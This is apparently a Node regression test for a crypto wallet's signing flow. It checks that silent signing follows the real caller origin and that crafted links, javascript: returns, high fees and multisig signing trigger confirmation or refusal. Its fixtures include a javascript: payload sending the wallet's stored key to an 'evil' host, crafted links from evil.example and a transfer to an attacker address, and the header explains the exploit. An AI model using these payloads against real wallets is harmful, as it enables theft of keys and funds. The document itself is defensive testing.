/* Silent signing is decided by WHO ASKED, not by the `ret` a request names (wallet audit 2026-09-25, HIGH).
 *
 * THE HOLE: `?exec_sign=<b64>&ret=https://chess.nadochain.com/` is a link anyone can send. The wallet decided trust
 * from `ret`, and value-free autosign is on by default — so a crafted link made a default wallet sign ANY value-free
 * call with no tap (e.g. `resign` in a staked game, which pays the pot to the opponent). With the opt-ins it signed
 * bets up to the cap (in NADO units, even for an asset), or any blob op at all (asset_transfer, asset_approve).
 *
 * THE RULE PINNED HERE: a request is signed silently only when its CALLER — e.origin on postMessage, the referrer's
 * origin on the URL path — is the trusted site `ret` names. Anything else gets the visible confirm, which now names
 * the mismatch and shows every counterparty (to / asset / spender / args). A javascript:/data: `ret` is refused (it
 * used to be navigated to: script on the wallet origin, next to the seed). The fee quote has a ceiling. A multisig
 * co-signer confirms before signing.
 *
 * The functions are LIFTED from static/interface.js and run against stubbed browser globals, so this tests the
 * shipped code, not a restatement of it.
 *
 * Run: node tests/test_exec_sign_trust.mjs
 */
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
let fails = 0;
const check = (name, cond, detail) => { console.log((cond ? 'PASS  ' : 'FAIL  ') + name + (cond || detail === undefined ? '' : '  ' + JSON.stringify(detail))); if (!cond) fails++; };
const js = readFileSync(join(ROOT, 'static', 'interface.js'), 'utf8');

function lift(start, end) {
  const i = js.indexOf(start);
  if (i < 0) throw new Error('not found in interface.js: ' + start);
  const j = js.indexOf(end, i + start.length);
  if (j < 0) throw new Error('end not found after: ' + start);
  return js.slice(i, j);
}
const SRC = [
  lift('const EXEC_SIGN_ALLOW = ', '\n'),
  lift('const ALLOW_LS = ', '\nfunction saveUserAllowedOrigins'),
  lift('const OFFICIAL_ORIGIN = ', '\n'),
  lift('const originAllowed = ', '\n'),
  lift('function _referrerOrigin()', '\nlet pendingExecSign'),
  lift('let pendingExecSign = ', '\n// EARLY background-sign triage'),
  lift('async function resumePendingExecSign()', '\nfunction wireAutosignToggle'),
  lift('let _bgSignListening = false;', '\n/* Network tag'),
  lift('const MAX_QUOTED_FEE = ', '\nasync function currentFeeRaw'),
].join('\n');

function harness({ search = '', referrer = '', ls = {}, confirmAnswer = false, fee = 1 } = {}) {
  const store = new Map(Object.entries(ls));
  const rec = { confirms: [], alerts: [], submitted: 0, navigated: [], posted: [], listeners: [] };
  const env = {
    localStorage: { getItem: (k) => (store.has(k) ? store.get(k) : null), setItem: (k, v) => store.set(k, String(v)) },
    location: { search, pathname: '/', hash: '', set href(v) { rec.navigated.push(v); } },
    history: { replaceState() {} },
    document: { referrer },
    window: { parent: { postMessage: (m, o) => rec.posted.push([m, o]) }, addEventListener: (t, f) => rec.listeners.push(f) },
    state: { wallet: { address: 'ndoVICTIM', publicKey: 'pk', privateKey: 'sk' } },
    uiConfirm: async (spec) => { rec.confirms.push(spec); return confirmAnswer; },
    uiAlert: async (b) => { rec.alerts.push(b); },
    i18: (k, d, v) => String(d).replace(/\{(\w+)\}/g, (_, n) => (v && n in v ? v[n] : '{' + n + '}')),
    initNetTag: async () => {}, signSplash: () => {}, modalCheckValue: () => false,
    submitResilient: async () => { rec.submitted++; return { res: { data: { result: true } }, tx: { txid: 't' } }; },
    rawToNado: (x) => String(x), _abShort: (s) => s, MIN_TX_FEE: 1000, TX_TARGET_MARGIN: 300,
    getLatestBlock: async () => ({ block_number: 1 }), buildBlobTx: () => ({}), buildTransferTx: () => ({}),
    finalizeTransaction: () => ({}), guardFrom: (h) => h, nowSeconds: () => 0, randNonce: () => 'n', CHAIN_ID: 'c',
    rpcJSON: async (u) => (u === '/get_recommended_fee' ? { ok: true, data: { fee } } : {}), _sha256hex: async () => '',
  };
  const names = Object.keys(env);
  const f = new Function(...names, SRC + '\nreturn { resumePendingExecSign, installBgSignListener, getRecommendedFee, ' +
                         'setPending: (r) => { pendingExecSign = r; }, getPending: () => pendingExecSign };');
  return { api: f(...names.map((n) => env[n])), rec, store };
}
const b64 = (o) => Buffer.from(unescape(encodeURIComponent(JSON.stringify(o))), 'binary').toString('base64');
const RESIGN = { blob: { op: 'call', contract: 'c'.repeat(32), method: 'resign', args: [7] } };
const q = (payload, ret) => '?exec_sign=' + encodeURIComponent(b64(payload)) + '&ret=' + encodeURIComponent(ret) + '&app=Chess';
const CHESS = 'https://chess.nadochain.com';

// ---- 1. the crafted link: trusted `ret`, but the victim got there from somewhere else ----------------------------
for (const [label, referrer] of [['another site', 'https://evil.example/x'], ['an email link (no referrer)', '']]) {
  const { api, rec } = harness({ search: q(RESIGN, CHESS + '/'), referrer });
  await api.resumePendingExecSign();
  check(`a crafted link from ${label} naming a trusted ret is NOT signed silently`, rec.submitted === 0, rec);
  check(`...it shows the visible confirm, which says the site did not ask`,
        rec.confirms.length === 1 && /did not come from https:\/\/chess\.nadochain\.com itself/.test(rec.confirms[0].warn || ''),
        rec.confirms[0] && rec.confirms[0].warn);
  check(`...and it offers no "auto-sign everything" checkbox`, rec.confirms.length === 1 && !rec.confirms[0].checkbox);
}

// ---- 2. the real game: the caller IS the trusted site -> still zero friction ---------------------------------------
{
  const { api, rec } = harness({ search: q(RESIGN, CHESS + '/game'), referrer: CHESS + '/game' });
  await api.resumePendingExecSign();
  check('the game itself asking (referrer == ret) still autosigns a value-free move with no tap',
        rec.submitted === 1 && rec.confirms.length === 0, rec);
  check('...and answers by navigating back to the game', rec.navigated.length === 1 && rec.navigated[0].startsWith(CHESS + '/game?ok=1'));
}

// ---- 3. a javascript: ret is never navigated to, even with "trust any site" on ----------------------------------
{
  const { api, rec } = harness({ search: q({ connect: 1 }, "javascript:fetch('//evil/'+localStorage.nado_miner_wallet)//"),
                                 ls: { nado_skip_origin_check: '1' }, confirmAnswer: false });
  await api.resumePendingExecSign();
  check('a javascript: ret is refused as malformed and never navigated to',
        rec.navigated.length === 0 && rec.alerts.length === 1 && rec.confirms.length === 0, rec);
}

// ---- 4. postMessage: the answer and the trust follow e.origin, never d.ret -----------------------------------------
{
  const { api, rec } = harness({ ls: { nado_skip_origin_check: '1' } });
  api.installBgSignListener();
  rec.listeners[0]({ origin: 'https://evil.example', source: { postMessage() {} },
                     data: { nadoExecSignReq: 1, payload: b64(RESIGN), ret: CHESS + '/', app: 'Chess' } });
  await new Promise((r) => setTimeout(r, 10));
  check('a postMessage from an untrusted sender naming a trusted ret is NOT signed silently', rec.submitted === 0, rec);
  check('...its answer goes to the SENDER, not to the ret it named',
        rec.posted.length >= 1 && rec.posted.every(([, o]) => o === 'https://evil.example'), rec.posted);
}
{
  const { api, rec } = harness();
  api.installBgSignListener();
  rec.listeners[0]({ origin: CHESS, source: { postMessage() {} }, data: { nadoExecSignReq: 1, payload: b64(RESIGN), app: 'Chess' } });
  await new Promise((r) => setTimeout(r, 10));
  check('the game\'s own hidden-frame request (e.origin == the game) still signs silently', rec.submitted === 1, rec);
}

// ---- 5. the opt-ins are held to what they say ----------------------------------------------------------------------
{
  const xfer = { blob: { op: 'asset_transfer', asset: '12345678901234567890', to: 'ndoATTACKER', amount: 500 } };
  const { api, rec } = harness({ search: q(xfer, CHESS + '/'), referrer: CHESS + '/', ls: { nado_autosign_all: '1' } });
  await api.resumePendingExecSign();
  check('"auto-sign everything" does NOT sign an asset_transfer, even from the trusted game', rec.submitted === 0, rec);
  const rows = rec.confirms[0] ? Object.fromEntries(rec.confirms[0].rows.map((r) => [r.k, r.v])) : {};
  check('...the confirm shows the recipient and the asset', rows.To === 'ndoATTACKER' && rows.Asset === '12345678901234567890', rows);
  check('...and the amount in asset units, not NADO', /units of asset/.test(rows.Amount || '') && !/NADO/.test(rows.Amount || ''), rows);
}
{
  const bet = { blob: { op: 'call', contract: 'c'.repeat(32), method: 'bet', args: [], value: 50, asset: '999' } };
  const { api, rec } = harness({ search: q(bet, CHESS + '/'), referrer: CHESS + '/', ls: { nado_autosign_bet_cap_raw: '100' } });
  await api.resumePendingExecSign();
  check('the NADO bet cap never autosigns an ASSET-valued call', rec.submitted === 0 && rec.confirms.length === 1, rec);
}
{
  const bet = { blob: { op: 'call', contract: 'c'.repeat(32), method: 'bet', args: [], value: 50 } };
  const { api, rec } = harness({ search: q(bet, CHESS + '/'), referrer: CHESS + '/', ls: { nado_autosign_bet_cap_raw: '100' } });
  await api.resumePendingExecSign();
  check('...while a NADO bet within the cap from the game itself still autosigns', rec.submitted === 1 && rec.confirms.length === 0, rec);
}

// ---- 6. the fee quote has a ceiling ---------------------------------------------------------------------------------
{
  const { api } = harness({ fee: 10 ** 15 });
  check('a relay-quoted fee is capped (fees are burned)', (await api.getRecommendedFee()) === 100 * 1000);
  const { api: a2 } = harness({ fee: 1 });
  check('...and never below MIN_TX_FEE', (await a2.getRecommendedFee()) === 1000);
}

// ---- 7. a multisig co-signer confirms before signing ------------------------------------------------------------
{
  const body = lift('async function msigSign()', '\nasync function msigSubmit');
  const iConfirm = body.indexOf('uiConfirm('), iSign = body.indexOf('msigTrySignLocal(');
  check('msigSign shows a confirm (amount, to, fee) BEFORE adding the signature',
        iConfirm > 0 && iSign > iConfirm && /dlg\.fee/.test(body.slice(iConfirm, iSign)) && /if \(!ok\)/.test(body.slice(iConfirm, iSign)));
}

console.log(fails ? `${fails} FAILURES` : 'ALL PASS — silent signing follows the caller, and every counterparty is shown');
process.exit(fails ? 1 : 0);
